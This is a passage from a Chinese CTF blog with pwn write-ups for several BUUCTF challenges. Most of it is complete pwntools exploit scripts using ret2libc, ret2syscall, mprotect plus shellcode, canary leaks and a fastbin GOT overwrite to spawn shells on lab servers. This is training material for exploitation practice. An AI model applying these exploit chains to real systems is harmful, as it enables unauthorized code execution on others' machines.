<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="三十三、picoctf-2018-rop-chain"><a href="#三十三、picoctf-2018-rop-chain" class="headerlink" title="三十三、picoctf_2018_rop chain"></a>三十三、picoctf_2018_rop chain</h3><p>常规32位rop即可getshell</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27038</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(printf_plt)+p32(main)+p32(printf_got)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>,payload)<br>printf=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;printf addr:&quot;</span>+<span class="hljs-built_in">hex</span>(printf))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;printf&#x27;</span>,printf)<br>libc_base=printf-libc.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">28</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>续：突然想去百度一下，看看那个给的后门函数是不是有用（因为我是没去用的，直接就是ret2libc了），结果发现，师傅们的解法是去利用已经给的函数，去让flag被打印出来，exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>, <span class="hljs-number">27036</span>)<br><br>win_function1 = <span class="hljs-number">0x080485CB</span><br>win_function2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(win_function1)<br>payload += p32(win_function2) + p32(flag) + p32(<span class="hljs-number">0xBAAAAAAD</span>) + p32(<span class="hljs-number">0xDEADBAAD</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt; &quot;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="三十四、picoctf-2018-buffer-overflow-1"><a href="#三十四、picoctf-2018-buffer-overflow-1" class="headerlink" title="三十四、picoctf_2018_buffer overflow 1"></a>三十四、picoctf_2018_buffer overflow 1</h3><p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25801</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2c</span>+p32(<span class="hljs-number">0x80485cb</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;string: &quot;</span>,payload)<br>p.recvall()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十五、jarvisoj-test-your-memory"><a href="#三十五、jarvisoj-test-your-memory" class="headerlink" title="三十五、jarvisoj_test_your_memory"></a>三十五、jarvisoj_test_your_memory</h3><p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210522154820.png"></p>
<p>checksec一下，然后进入ida</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210522154920.png"></p>
<p>这题的溢出点在scanf，然后，这里的检查保护，似乎没什么用处，并不能影响到退栈时候，我们控制eip，所以不用管，然后后门函数给了，直接用就好了。</p>
<p>这题跟之前有道类似，这次我学聪明了，很早就nc看了，远程和本地不一样，远程先要我们进行输入，这里算是一个点；还有个就是，调用程序函数打印flag的时候，返回地址处要写存在的地址，不可以随便填写，否则无法得到flag。</p>
<img src="/2021/04/07/2021-04-07-buu03/QQ图片20210522155322.png" style="zoom:80%;">

<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27280</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>system=<span class="hljs-number">0x080485BD</span><br>flag=<span class="hljs-number">0x80487e0</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x17</span>+p32(system)+p32(flag)+p32(flag)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十六、cmcc-simplerop"><a href="#三十六、cmcc-simplerop" class="headerlink" title="三十六、cmcc_simplerop"></a>三十六、cmcc_simplerop</h3><p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210522172402.png"></p>
<p>checksec一下，然后拖进ida。</p>
<img src="/2021/04/07/2021-04-07-buu03/QQ图片20210522172444.png" style="zoom:80%;">

<p>符号表满满当当，静态链接了。一般考虑为ret2syscall。也确实，ROPgadget寻找了一番，syscall需要的都有了。除了没有/bin/sh，最开始我是直接寻找sh字符串的，因为有的题目sh也是可以getshell的，但是这题不行。就必须要找地方输入/bin/sh了，这个地方当然是.bss段啦</p>
<p>然后就是这边的溢出IDA里面有误，需要gdb里面进行寻找，偏移为32才对。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210522162230.png"></p>
<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>int_80=<span class="hljs-number">0x0806EEF0</span><br>sh=<span class="hljs-number">0x080eafe1</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(pop_eax)+p32(<span class="hljs-number">0x3</span>)+p32(ppp_ret)+p32(<span class="hljs-number">8</span>)+p32(bss)+p32(<span class="hljs-number">0</span>)+p32(int_80)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第一个写法，是我转后写的样子，但是我的不行，出现下面的报错打不通。去百度了，但是由于博客园审核，没能查看到博文</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210522172906.png"></p>
<p>这边似乎是execve的条件未达成，可是我与上面的exp差别只在于int 80的地址不同，我的是ROPgadget中找到的，而上面exp里面的int 80，是我在一个师傅的wp里面发现的，两者不一样</p>
<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>int_80=<span class="hljs-number">0x080493e1</span><br>sh=<span class="hljs-number">0x080c1a9d</span><br>bss=<span class="hljs-number">0x080eaf80</span><br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>pop_eax=<span class="hljs-number">0x080bae06</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">8</span>)<br>payload+=p32(pop_eax)+p32(<span class="hljs-number">0xB</span>)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(int_80)<br><br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二个方法其实本质原理与上一个一样，就是跳转read的构造方式不一样，这边直接使用地址跳转，而不是系统调用。注意这两个方法的int 80不一样，用第二的int 80调用两次就会出现上图的情况</p>
<p>exp3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level =<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">29838</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>bss=<span class="hljs-number">0x080eaf80</span><br>mprotect=elf.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read=elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>ppp_ret=<span class="hljs-number">0x0806e850</span>   <span class="hljs-comment">#pop_edx_ecx_ebx_ret</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">32</span>+p32(mprotect)+p32(ppp_ret)+p32(<span class="hljs-number">0x80ea000</span>)+p32(<span class="hljs-number">0x2000</span>)+p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read)+p32(ppp_ret)+p32(<span class="hljs-number">0</span>)+p32(bss)+p32(<span class="hljs-number">0x50</span>)+p32(bss)<br>p.sendlineafter(<span class="hljs-string">&quot;input :&quot;</span>,payload)<br>p.send(asm(shellcraft.sh()))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第三个方法是使用mprotect把.bss修改为可执行，然后注入shellcode来getshell，有个点是修改的起始位置，得要最后三个为0才行，否则打不通，像是内存对齐的问题。</p>
<h3 id="三十七、mrctf2020-shellcode"><a href="#三十七、mrctf2020-shellcode" class="headerlink" title="三十七、mrctf2020_shellcode"></a>三十七、mrctf2020_shellcode</h3><p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210522191716.png"></p>
<p>checksec一下，预测是注入shellcode，然后拖进IDA。</p>
<img src="/2021/04/07/2021-04-07-buu03/QQ图片20210522191817.png" style="zoom:80%;">

<p>这题出没办法反汇编，百度上的wp也没办法，可能是直接call rax有点问题。不过好在汇编不复杂，很简单的程序逻辑，先输入0x400，然后做一个判断，其实这个判断无影响的，有输入的话，rax返回值就是大于0，跳转到右侧去执行，右侧是直接执行我们输入的数据，所以这边是直接ret2shellcode</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27104</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;magic!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十八、others-babystack"><a href="#三十八、others-babystack" class="headerlink" title="三十八、others_babystack"></a>三十八、others_babystack</h3><p>这题代码很简单，canary也很容易泄露，其他就是rop。所以不多说。</p>
<p>注意点就是，这里的退栈要执行功能3才能退出，我刚开始一直反应过来，后面才发现的。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27939</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=<span class="hljs-number">0x400908</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400a93</span><br><span class="hljs-comment">#泄漏canary</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>)<br>canary=u64(p.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;canary: &quot;</span>+<span class="hljs-built_in">hex</span>(canary))<br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>puts=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts)<br>libc_base=puts-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="三十九、-ZJCTF-2019-EasyHeap"><a href="#三十九、-ZJCTF-2019-EasyHeap" class="headerlink" title="三十九、[ZJCTF 2019]EasyHeap"></a>三十九、[ZJCTF 2019]EasyHeap</h3><p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210525230925.png"></p>
<p>checksec一下， 然后进入ida。根据题目已经知道是个heap题目。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210525231121.png"></p>
<p>这边在编辑chunk上内容时候，输入的大小是再次由我们确定的，所以这里有着堆溢出漏洞，可以修改后一个chunk的fd指针，导致任意写的目的。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210525231025.png"></p>
<p>这边释放已经把指针置空了。</p>
<p>生成chunk就没什么好说的，然后这里是没有打印函数的，如果要输出就比较麻烦，要用IO结构体输出了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210525231313.png"></p>
<p>这边其实有个后门函数的，可能是原题的有，但是这是buu，做到这大家应该都知道，flag就是直接在/根目录下的，所以不用去尝试就知道这里不行，但是给了system函数，got又可以改写，这边就使用修改got表的方法。具体脚本写，exp的注释十分详细了，步骤也不复杂，就不赘述了。</p>
<p>具体脚本编写，我在百度里面找到了一个师傅写的很详细，就直接搬过来了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26437</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020e0</span>-<span class="hljs-number">0x40</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br><span class="hljs-comment"># 修改 heap1 内容为 &#x27;/bin/sh\x00&#x27;, 以及堆溢出 heap2(freed) 修改其 fd 指针 </span><br><span class="hljs-comment"># 因为最后释放的是 heap1,利用 &#x27;__free_hook&#x27;(system) Getshell </span><br><span class="hljs-comment"># 为什么是 0x6020e0-0x40+0xd，这个偏移就是去寻找7f的固定手法，只是改变-后面的去找符合条件的就是了</span><br><span class="hljs-comment"># FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f</span><br><span class="hljs-comment"># 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)</span><br><span class="hljs-comment"># 这样就伪造出了一个 chunk</span><br>new(<span class="hljs-number">0x68</span>)<br>new(<span class="hljs-number">0x68</span>)<br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(free_got)<br>edit(<span class="hljs-number">3</span>,payload)<br><span class="hljs-comment"># 修改 heap3 (Fake)</span><br><span class="hljs-comment"># 作用是把 heaparray[0] 的地址 (原先记录的是 chunk0的地址) 覆写成 free_got 地址</span><br><span class="hljs-comment"># 这就是要在 heaparry 附近构造 Fakeheap 的原因</span><br><span class="hljs-comment"># 确定具体的偏移量需要动态调试 </span><br>edit(<span class="hljs-number">0</span>,p64(system))<br><span class="hljs-comment"># free_got 地址的作用在这里体现了</span><br><span class="hljs-comment"># 由于 edit() 的目标是 heaparry[] 里面的地址</span><br><span class="hljs-comment"># 那么本次操作将修改 free_got 为 system_plt 的地址</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 当释放 chunk1 (内容为 &#x27;/bin/sh\0x00&#x27;) 的时候</span><br><span class="hljs-comment"># 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()</span><br><span class="hljs-comment"># 最后程序执行的就是 system(chunk1&#x27;s content) 即 system(&#x27;/bin/sh\0x00&#x27;), 成功 Getshell</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二个我自己写的没能打通，看报错像是检验大小没过，可是我之前做过一道题，这样子也是可以创建堆块的，我是想把chunk直接创建在free的got.plt里面，直接改就好了，没必要像上面绕一圈子，没想过不行。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210527152159.png"></p>
<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,28313)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>free_got=<span class="hljs-number">0x602018</span><br>system=<span class="hljs-number">0x400700</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p)<br>	pause()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>	p.sendafter(<span class="hljs-string">&quot;heap:&quot;</span>,p64(<span class="hljs-number">0</span>))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>	p.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.sendafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>delete(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(free_got-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>debug()<br>new(<span class="hljs-number">0x60</span>)<br>new(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">3</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(system))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>delete(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十、bjdctf-2020-babyrop2"><a href="#四十、bjdctf-2020-babyrop2" class="headerlink" title="四十、bjdctf_2020_babyrop2"></a>四十、bjdctf_2020_babyrop2</h3><p>checksec一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210529100246.png"></p>
<p>开启了NX和Canary</p>
<p>进入ida看看代码</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210529100325.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210529100334.png"></p>
